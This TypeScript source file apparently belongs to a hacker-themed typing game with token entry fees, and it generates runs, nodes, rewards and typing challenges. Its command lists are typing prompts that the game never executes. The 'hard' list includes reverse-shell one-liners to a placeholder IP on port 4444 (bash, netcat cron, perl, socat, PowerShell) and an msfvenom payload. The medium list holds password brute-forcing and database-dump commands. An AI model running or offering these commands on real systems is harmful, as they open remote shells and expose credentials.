/**
 * Hack Run Generators
 * ===================
 * Generate run configurations, nodes, and typing challenges
 * with terminal/hacker-themed content.
 */

import type {
	HackRun,
	HackRunNode,
	HackRunDifficulty,
	NodeType,
	NodeReward,
	NodeProgress,
} from '$lib/core/types/hackrun';
import type { TypingChallenge } from '$lib/core/types';
import { NODE_TYPE_CONFIG } from '$lib/core/types/hackrun';

// ════════════════════════════════════════════════════════════════
// CONFIGURATION
// ════════════════════════════════════════════════════════════════

/** Run configuration by difficulty */
export const RUN_CONFIG: Record<
	HackRunDifficulty,
	{
		entryFee: bigint;
		baseMultiplier: number;
		timeLimit: number;
		shortcuts: number;
		nodeCount: number;
	}
> = {
	easy: {
		entryFee: 50n * 10n ** 18n,
		baseMultiplier: 1.5,
		timeLimit: 5 * 60 * 1000,
		shortcuts: 0,
		nodeCount: 5,
	},
	medium: {
		entryFee: 100n * 10n ** 18n,
		baseMultiplier: 2.0,
		timeLimit: 4 * 60 * 1000,
		shortcuts: 1,
		nodeCount: 5,
	},
	hard: {
		entryFee: 200n * 10n ** 18n,
		baseMultiplier: 3.0,
		timeLimit: 3 * 60 * 1000,
		shortcuts: 2,
		nodeCount: 5,
	},
};

/** Multiplier duration in milliseconds (4 hours) */
export const MULTIPLIER_DURATION = 4 * 60 * 60 * 1000;

// ════════════════════════════════════════════════════════════════
// TERMINAL COMMANDS (TYPING CHALLENGES)
// ════════════════════════════════════════════════════════════════

/** Terminal commands by difficulty */
const COMMANDS: Record<'easy' | 'medium' | 'hard', string[]> = {
	easy: [
		'ls -la /home',
		'cat passwd',
		'chmod 755 file',
		'ping localhost',
		'echo $PATH',
		'mkdir data',
		'rm -rf tmp',
		'ps aux',
		'whoami',
		'pwd',
		'df -h',
		'top -n 1',
		'netstat -an',
		'uname -a',
		'ifconfig eth0',
	],
	medium: [
		'ssh root@192.168.1.1',
		'nmap -sV -p 22,80,443 target',
		'openssl enc -aes-256-cbc -d',
		'tcpdump -i eth0 port 443',
		'iptables -A INPUT -j DROP',
		'grep -r "password" /etc/',
		'find / -perm -4000 2>/dev/null',
		'curl -X POST -d @payload.json',
		'john --wordlist=rockyou.txt hash',
		'hydra -l admin -P pass.txt ssh://',
		'sqlmap -u "?id=1" --dump',
		'msfconsole -x "use exploit"',
		'nikto -h https://target.com',
		'gobuster dir -u http://target',
		'wpscan --url http://target',
	],
	hard: [
		'python3 -c "import pty;pty.spawn(\'/bin/bash\')"',
		'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
		'msfvenom -p linux/x64/shell_reverse_tcp LHOST=',
		'gcc -o exploit exploit.c -fno-stack-protector',
		'echo "* * * * * /bin/nc -e /bin/sh 10.0.0.1 4444"',
		'awk \'BEGIN{s="/inet/tcp/0/10.0.0.1/4444";while(1)}\'',
		'perl -e \'use Socket;$i="10.0.0.1";$p=4444;socket()\'',
		"socat exec:'bash -li',pty,stderr,setsid,sigint,sane",
		'openssl s_client -quiet -connect 10.0.0.1:443|/bin/sh',
		'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient"',
	],
};

/** Node names by type */
const NODE_NAMES: Record<NodeType, string[]> = {
	firewall: ['FIREWALL_ALPHA', 'GATE_KEEPER', 'SEC_WALL_7G', 'BARRIER_X42', 'SHIELD_NODE'],
	patrol: ['PATROL_BOT_3', 'SCAN_DRONE', 'WATCHDOG_AI', 'SENTRY_LOOP', 'GUARD_CYCLE'],
	data_cache: ['DATA_VAULT', 'CACHE_PRIME', 'STORAGE_X', 'ARCHIVE_CORE', 'MEMORY_BANK'],
	trap: ['ALERT_ZONE', 'TRIPWIRE_7', 'SNARE_NODE', 'BAIT_CACHE', 'DANGER_SECTOR'],
	ice_wall: ['ICE_BARRIER', 'FROST_GATE', 'CRYO_WALL', 'FREEZE_SEC', 'COLD_LOGIC'],
	honeypot: ['REWARD_NODE', 'PRIZE_CACHE', 'LOOT_BOX', 'GOLD_MINE', 'JACKPOT_X'],
	backdoor: ['BACKDOOR_7G', 'SECRET_PATH', 'BYPASS_NODE', 'SHORTCUT_X', 'HIDDEN_GATE'],
};

/** Node descriptions by type */
const NODE_DESCRIPTIONS: Record<NodeType, string[]> = {
	firewall: [
		'Standard perimeter defense. Bypass with precision.',
		'Corporate firewall detected. Moderate encryption.',
		'Security checkpoint. Stay focused.',
	],
	patrol: [
		'Automated security sweep. Easy pickings.',
		'Low-priority scan routine. Quick bypass.',
		'Basic patrol algorithm. Should be simple.',
	],
	data_cache: [
		'Encrypted data store. High value target.',
		'Sensitive files detected. Worth the risk.',
		'Corporate secrets ahead. Big rewards.',
	],
	trap: [
		'WARNING: Anomalous activity detected.',
		'CAUTION: Pattern suggests countermeasure.',
		'ALERT: Possible honeypot configuration.',
	],
	ice_wall: [
		'Intrusion Countermeasures Electronics. Hard target.',
		'Advanced ICE detected. Requires skill.',
		'Military-grade protection. Proceed carefully.',
	],
	honeypot: [
		'Unusual access pattern. Could be bait.',
		'Too easy? Trust your instincts.',
		'Suspicious configuration. Risk vs reward.',
	],
	backdoor: [
		'Developer access point. Skip ahead.',
		'Legacy vulnerability. Risky shortcut.',
		'Maintenance tunnel. Fast but dangerous.',
	],
};

// ════════════════════════════════════════════════════════════════
// UTILITY FUNCTIONS
// ════════════════════════════════════════════════════════════════

/** Generate a unique ID */
function generateId(): string {
	return `${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 9)}`;
}

/** Pick random element from array */
function randomElement<T>(arr: T[]): T {
	return arr[Math.floor(Math.random() * arr.length)];
}

/** Weighted random selection */
function weightedRandom<T>(items: T[], weights: number[]): T {
	const total = weights.reduce((a, b) => a + b, 0);
	let random = Math.random() * total;
	for (let i = 0; i < items.length; i++) {
		random -= weights[i];
		if (random <= 0) return items[i];
	}
	return items[items.length - 1];
}

// ════════════════════════════════════════════════════════════════
// GENERATORS
// ════════════════════════════════════════════════════════════════

/**
 * Generate a typing challenge appropriate for the node and difficulty
 */
export function generateTypingChallenge(
	nodeType: NodeType,
	difficulty: HackRunDifficulty
): TypingChallenge {
	const config = NODE_TYPE_CONFIG[nodeType];

	// Adjust effective difficulty based on node type
	let effectiveDifficulty: 'easy' | 'medium' | 'hard' = difficulty;
	if (config.challengeDifficultyModifier > 0 && difficulty !== 'hard') {
		effectiveDifficulty = difficulty === 'easy' ? 'medium' : 'hard';
	} else if (config.challengeDifficultyModifier < 0 && difficulty !== 'easy') {
		effectiveDifficulty = difficulty === 'hard' ? 'medium' : 'easy';
	}

	const command = randomElement(COMMANDS[effectiveDifficulty]);

	// Time limit based on command length and difficulty
	const baseTime = Math.max(5, Math.ceil(command.length / 3));
	const difficultyMultiplier = { easy: 1.5, medium: 1.2, hard: 1.0 }[difficulty];
	const timeLimit = Math.ceil(baseTime * difficultyMultiplier);

	return {
		command,
		difficulty: effectiveDifficulty,
		timeLimit,
	};
}

/**
 * Generate reward for a node based on type and difficulty
 */
function generateNodeReward(nodeType: NodeType, difficulty: HackRunDifficulty): NodeReward {
	const config = NODE_TYPE_CONFIG[nodeType];
	const difficultyBonus = { easy: 1.0, medium: 1.3, hard: 1.6 }[difficulty];

	if (nodeType === 'trap') {
		return { type: 'none', value: 0, label: 'CAUTION' };
	}

	if (nodeType === 'backdoor') {
		return { type: 'skip', value: 1, label: 'SKIP +1' };
	}

	if (nodeType === 'data_cache' || nodeType === 'honeypot') {
		// These can give loot
		const lootChance = nodeType === 'data_cache' ? 0.7 : 0.4;
		if (Math.random() < lootChance) {
			const lootAmount = Math.floor(10 * config.baseRewardMultiplier * difficultyBonus);
			return { type: 'loot', value: lootAmount, label: `+${lootAmount} $DATA` };
		}
	}

	// Default: multiplier reward
	const multiplierValue = 0.1 * config.baseRewardMultiplier * difficultyBonus;
	const rounded = Math.round(multiplierValue * 100) / 100;
	return { type: 'multiplier', value: rounded, label: `+${rounded}x YIELD` };
}

/**
 * Generate a single node for a hack run
 */
export function generateNode(
	position: number,
	difficulty: HackRunDifficulty,
	allowedTypes?: NodeType[]
): HackRunNode {
	// Node type weights (adjusted by position)
	const types: NodeType[] = allowedTypes ?? [
		'firewall',
		'patrol',
		'data_cache',
		'trap',
		'ice_wall',
		'honeypot',
	];

	const weights = types.map((type) => {
		const config = NODE_TYPE_CONFIG[type];
		let weight = 1;

		// Adjust weights by difficulty
		if (difficulty === 'easy') {
			weight = config.risk === 'low' ? 3 : config.risk === 'extreme' ? 0.2 : 1;
		} else if (difficulty === 'hard') {
			weight = config.risk === 'extreme' ? 1.5 : config.risk === 'low' ? 0.5 : 1;
		}

		// Later positions have higher risk nodes
		if (position >= 4 && (config.risk === 'high' || config.risk === 'extreme')) {
			weight *= 1.5;
		}

		return weight;
	});

	const nodeType = weightedRandom(types, weights);
	const config = NODE_TYPE_CONFIG[nodeType];

	return {
		id: generateId(),
		type: nodeType,
		position,
		name: randomElement(NODE_NAMES[nodeType]),
		description: randomElement(NODE_DESCRIPTIONS[nodeType]),
		challenge: generateTypingChallenge(nodeType, difficulty),
		reward: generateNodeReward(nodeType, difficulty),
		risk: config.risk,
		hidden: position > 1, // First node always visible
	};
}

/**
 * Generate a backdoor node for shortcuts
 */
function generateBackdoorNode(position: number, skipTo: number): HackRunNode {
	return {
		id: generateId(),
		type: 'backdoor',
		position,
		name: randomElement(NODE_NAMES.backdoor),
		description: randomElement(NODE_DESCRIPTIONS.backdoor),
		challenge: generateTypingChallenge('backdoor', 'medium'),
		reward: { type: 'skip', value: skipTo - position, label: `SKIP TO NODE ${skipTo}` },
		risk: 'medium',
		hidden: true,
		alternativePaths: [], // Will be filled with target node ID
	};
}

/**
 * Generate a complete hack run with nodes and optional shortcuts
 */
export function generateRun(difficulty: HackRunDifficulty): HackRun {
	const config = RUN_CONFIG[difficulty];
	const nodes: HackRunNode[] = [];

	// Generate main path nodes
	for (let i = 1; i <= config.nodeCount; i++) {
		nodes.push(generateNode(i, difficulty));
	}

	// Add backdoor shortcuts for medium/hard
	if (config.shortcuts > 0) {
		// Place backdoors at strategic positions (early nodes that skip to later)
		const backdoorPositions = [2, 3].slice(0, config.shortcuts);

		for (const pos of backdoorPositions) {
			const skipTo = Math.min(pos + 2, config.nodeCount);
			const backdoor = generateBackdoorNode(pos, skipTo);

			// Link to target node
			const targetNode = nodes.find((n) => n.position === skipTo);
			if (targetNode) {
				backdoor.alternativePaths = [targetNode.id];
			}

			nodes.push(backdoor);
		}
	}

	return {
		id: generateId(),
		difficulty,
		entryFee: config.entryFee,
		nodes,
		baseMultiplier: config.baseMultiplier,
		timeLimit: config.timeLimit,
		shortcuts: config.shortcuts,
	};
}

/**
 * Generate available runs for selection (one of each difficulty)
 */
export function generateAvailableRuns(): HackRun[] {
	return [generateRun('easy'), generateRun('medium'), generateRun('hard')];
}

/**
 * Initialize progress tracking for a run
 */
export function initializeProgress(run: HackRun): NodeProgress[] {
	// Only track main path nodes (not backdoors)
	const mainNodes = run.nodes
		.filter((n) => n.type !== 'backdoor')
		.sort((a, b) => a.position - b.position);

	return mainNodes.map((node, index) => ({
		nodeId: node.id,
		status: index === 0 ? 'current' : 'pending',
	}));
}

// ════════════════════════════════════════════════════════════════
// XP & REWARD CALCULATIONS
// ════════════════════════════════════════════════════════════════

/** Base XP by difficulty */
const BASE_XP: Record<HackRunDifficulty, number> = {
	easy: 50,
	medium: 100,
	hard: 200,
};

/** XP bonus per completed node */
const NODE_XP_BONUS = 20;

/** XP bonus for perfect run (all nodes, high accuracy) */
const PERFECT_RUN_BONUS = 100;

/**
 * Calculate XP earned from a run
 */
export function calculateXP(run: HackRun, progress: NodeProgress[]): number {
	const baseXP = BASE_XP[run.difficulty];
	const completedNodes = progress.filter((p) => p.status === 'completed').length;
	const nodeBonus = completedNodes * NODE_XP_BONUS;

	// Perfect run bonus: all nodes completed with >90% average accuracy
	const completedWithResults = progress.filter((p) => p.status === 'completed' && p.result);
	const avgAccuracy =
		completedWithResults.length > 0
			? completedWithResults.reduce((sum, p) => sum + (p.result?.accuracy ?? 0), 0) /
				completedWithResults.length
			: 0;

	const perfectBonus =
		completedNodes === run.nodes.filter((n) => n.type !== 'backdoor').length && avgAccuracy >= 0.9
			? PERFECT_RUN_BONUS
			: 0;

	return baseXP + nodeBonus + perfectBonus;
}

/**
 * Calculate final multiplier from completed nodes
 */
export function calculateFinalMultiplier(run: HackRun, progress: NodeProgress[]): number {
	let multiplier = run.baseMultiplier;

	for (const p of progress) {
		if (p.status === 'completed' && p.result) {
			multiplier += p.result.multiplierGained;
		}
	}

	return Math.round(multiplier * 100) / 100;
}

/**
 * Calculate total loot from completed nodes
 */
export function calculateTotalLoot(progress: NodeProgress[]): bigint {
	let total = 0n;

	for (const p of progress) {
		if (p.status === 'completed' && p.result) {
			total += p.result.lootGained;
		}
	}

	return total;
}
